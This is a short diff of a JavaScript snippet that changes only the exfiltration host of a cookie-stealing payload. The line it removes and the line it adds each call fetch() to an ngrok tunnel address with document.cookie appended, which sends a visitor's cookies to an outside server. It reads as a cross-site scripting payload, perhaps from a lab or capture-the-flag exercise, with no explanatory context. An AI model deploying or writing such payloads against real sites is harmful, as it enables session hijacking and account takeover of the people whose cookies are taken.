@@ -1,4 +1,4 @@
-fetch('https://fd820e801b58.ngrok-free.app/'+document.cookie, {method: 'GET', mode:'no-cors'})
+fetch('https://b8bf34f0a1d0.ngrok-free.app/'+document.cookie, {method: 'GET', mode:'no-cors'})
   .then(response => {
     if (!response.ok) {
       throw new Error(`HTTP error! Status: ${response.status}`);
